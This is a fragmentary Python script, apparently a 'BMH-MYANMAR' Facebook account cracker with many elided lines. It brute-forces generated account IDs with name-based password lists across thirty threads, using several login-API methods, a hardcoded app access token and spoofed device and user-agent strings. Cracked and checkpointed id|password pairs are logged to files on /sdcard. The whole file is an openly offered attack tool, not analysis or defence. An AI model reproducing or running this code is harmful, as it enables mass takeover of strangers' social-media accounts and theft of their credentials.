...
[~] Inportant: Logo Error Lay Par Tar Tee Khan Par 
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;36m-----------------------------------------')
def clear():
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				...
				print('  working tool ')
				linex()
				print(' \033[1;37m[1] \033[1;34mMethod  (for mix id)  \033[1;36m (fast) \n\033[1;37m [2] \033[1;34mMethod  (for mix id) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;31m Method  (With Your Father)\033[1;34m   (v.fast) \n\033[1;37m [4]\033[1;38m Method  (for new id)\033[1;32m   (best) \n \033[1;34m[5] \033[1;37mMethod  (for new id) \033[1;31m  (slow) \n \033[1;37m[6] \033[1;32mMethod  (for new id) \n \033[1;34m[7] \033[1;39mMethod  (for new id) \n \033[1;32m[8] \033[1;37mMethod  (for new id) ')
				linex()
				mthd=input(' Choice: ')
				linex()
				plist = []
...
def pak():
		...
		with tred(max_workers=30) as BMH:
			...
			print(' \033[1;37mThe process  running in the background')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;35m [BMH-M1-MYANMAR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						...
						open('/sdcard/BMH-OKS.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/BMH-OKS.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;35m [BMH-M2-MYANMAR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [BMH-OKS] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BMH-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BMH-M3-MYANMAR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [BMH-MYANMAR-OKS] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BMH-OKS.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;35m [BMH-M4-MYANMAR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [BMH-MYANMAR-OKS] '+ids+' | '+pas+'\033[1;97m')
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;35m [BMH-M5-MYANMAR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;36m [BMH-M6-MYANMAR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;36m [BMH-M7-MYANMAR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SK:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;35m [BMH-MYANMAR-OK] %s | %s'%(ids,pas))
				open('/sdcard/BMH-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SK:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;206m [BMH-MYANMAR-OKS] '+ids+' | '+pas+'\033[1;95m')
					open('/sdcard/BMH-OKS.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;36m [BMH-M8-MYANMAR] %s|\033[1;37mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SK:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [BMH-MYANMAR-OKS] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/BMH-OKS.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;35m [BMH-MYANMAR-M1] %s|\033[1;37mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [BMH-MYANMAR-OKS] '+str(uid)+' | '+pas+'\033[1;96m')
                                        open('/sdcard/BMH-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;36m [BMH-M2-MYANMAR] %s|\033[1;37mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			...
			if 'session_key' in q:
				...
				open('/sdcard/BMH-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;208m [BMH-MYANMAR-OKS] '+ids+' | '+pas+'\033[1;96m')
				open('/sdcard/BMH-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def trt3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;36m [BMH-M3-MYANMAR] %s|\033[1;35mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;5;208m [BMH-MYANMAR-OKS] '+str(uid)+' | '+pas+'\033[1;96m')
                                        open('/sdcard/BMH-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;36m [BMH-M4-MYANMAR] %s|\033[1;35mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[36;5;208m [BMH-MYANMAR-OKS] '+str(uid)+' | '+pas+'\033[1;96m')
                                        open('/sdcard/BMH-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
...
def trt5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;36m [BMH-M5-MYANMAR] %s|\033[1;37mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def trt6(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;36m [BMH-M6-MYANMAR] %s|\033[1;36mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						open('/sdcard/BMH-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[36;5;208m [BMH-MYANMAR-OKS] '+uid+' | '+pas+'\033[1;96m')
					open('/sdcard/BMH-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
